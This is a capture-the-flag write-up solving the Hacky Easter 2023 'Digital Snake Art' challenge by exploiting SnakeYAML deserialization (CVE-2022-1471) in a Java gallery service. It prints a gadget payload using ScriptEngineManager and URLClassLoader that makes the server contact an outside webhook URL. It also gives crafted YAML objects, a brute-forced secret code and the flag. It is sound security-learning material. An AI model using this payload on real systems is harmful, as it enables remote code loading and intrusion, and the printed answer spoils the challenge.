# Description

# Digital Snake Art

I'm a big fan of digital art!

How do you like my new gallery?

<http://ch.hackyeaster.com:2307>

Note: The service is restarted every hour at x:00.

# Solution

come on.. a java application?...

after looking at the code i noticed that the get parameter `art` was parsed by snakeyaml as the SnakeArt.class, from the infamouse log4shell exploit i knew that something like that can be very very bad

so lets look for some snakeyaml deserialization exploits:

<https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858>

found a recent cve, this will be it i guess!!

<https://nvd.nist.gov/vuln/detail/CVE-2022-1471>


found a poc, but this is useless to me...

<https://github.com/1fabunicorn/SnakeYAML-CVE-2022-1471-POC>

another one

<https://github.com/advisories/GHSA-mjmj-j48q-9wg2>

they all only use payloads which connect to a webserver... but noone tells me how to build my own payload to do stuff i want...

well i am really sure this is the thing i need to exploit, but i really don't know how

so i tried to at least get a successful connection to a webserver using this payload and the <https://webhook.site/> service

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["https://webhook.site/b7891e85-f248-47a1-a84d-e915e77ff370"]
  ]]
]
```

this are the request headers i got:

```
Headers
connection	close
accept	text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
host	webhook.site
user-agent	Java/1.8.0_212
content-length
content-type
```

so it looks valid!

this cve showed me that i can load and execute jar files using this payload type

<https://www.websec.ca/publication/Blog/CVE-2022-21404-Another-story-of-developers-fixing-vulnerabilities-unknowingly-because-of-CodeQL>

so maybe this is the solution?!

after some time i tried again..., and tried this first - it actually did something!

```
!!com.hackyeaster.digitalsnakeart.Image [ "test" ]
```

this looks like help:

<https://stackabuse.com/reading-and-writing-yaml-files-in-java-with-snakeyaml/>


so after some trying i got to this:

```
name: Snake and Rabbit Being Friends
image: !!com.hackyeaster.digitalsnakeart.Flag [ !!com.hackyeaster.digitalsnakeart.Code [ 123]]
source: DALL-E
resolution: 256x256
```

so what i need to do is for the image input i need to provide an image class object (the flag class inherits image, so that works)

since to instantiate the flag class i also need to instantiate the code class

now i "only" need to get the right code

oh well...

just bruteforce it...

```
return (code > 0 && code < 500 && code == SnakeService.getSecretCode());
```

the solve script is not pretty, because i put the whole wrong picture in it, but it works!

```
$ python3 solve.py 
198
```

so here we go! exploiting it again manually with the right code to get the flag picture

```
$ zbarimg solution.png 
QR-Code:he2023{0n3_d03s_n0t_s1mply_s0lv3_th1s_chllng!}
scanned 1 barcode symbols from 1 images in 0.05 seconds
```

# FLAG: he2023{0n3_d03s_n0t_s1mply_s0lv3_th1s_chllng!}
